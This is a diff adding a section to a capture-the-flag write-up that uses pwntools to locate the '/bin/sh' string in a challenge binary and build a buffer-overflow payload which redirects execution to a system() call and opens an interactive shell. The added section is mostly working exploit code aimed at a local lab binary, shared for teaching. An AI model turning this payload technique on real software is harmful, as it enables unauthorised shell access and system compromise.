@@ -173,3 +173,29 @@ cyclic_find('oaaa')
 ```
 So now we know our input will need some 40 characters, then the address for "/bin/sh", then another 12 characters (the string address will be 4 bytes long, so 44 + 12 = 56), then the address to the instruction we want to execute.
 
+### Putting it all into pwntools (the thing that makes this super easy)
+So, using pwntools we can quickly grab the pointer to the "/bin/sh" string that we need. That looks like this,
+```py
+from pwn import *
+
+challenge = ELF(r'/mnt/c/Users/ssamu/Downloads/qutwh-pwn-challenge-main/challenge')
+p = next(challenge.search(b"/bin/sh"))
+print(p) # Prints 134520901, the decimal representation of 0x804A045
+```
+Alright, the pointer to "/bin/sh" is `0x804A045`, now lets build our payload.
+```py
+from pwn import *
+
+challenge = ELF(r'/mnt/c/Users/ssamu/Downloads/qutwh-pwn-challenge-main/challenge') #Open the binary with pwn tools
+
+win_address = 0x080491d5 #Address to the instruction just before the system() call
+bin_param = 0x804A045 #Address pointing to the "/bin/sh" string
+
+#40 A's, then the address to the "/bin/sh" string, then another 12 A's, then the address to the instruction just before the system() call
+payload = b'A'*(40) + p32(bin_param) + b'A'*(12) + p32(win_address) + b"\n"
+#We use the p32() function around our addresses so that the address is formatted to how the binary expects it.
+
+p = challenge.process() #Start the binary
+p.sendline(payload) #Send the payload as input
+p.interactive() #Change to interactive mode so we can interact with the shell
+```
